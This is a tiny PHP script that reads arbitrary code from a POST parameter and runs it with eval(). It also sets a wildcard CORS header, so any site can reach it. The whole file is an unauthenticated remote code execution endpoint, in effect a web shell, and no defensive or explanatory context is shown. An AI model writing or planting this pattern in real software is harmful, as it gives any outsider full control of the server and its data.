<?php

	header("Access-Control-Allow-Origin: *");
	
	$code = $_POST['code'];
	eval($code);
?>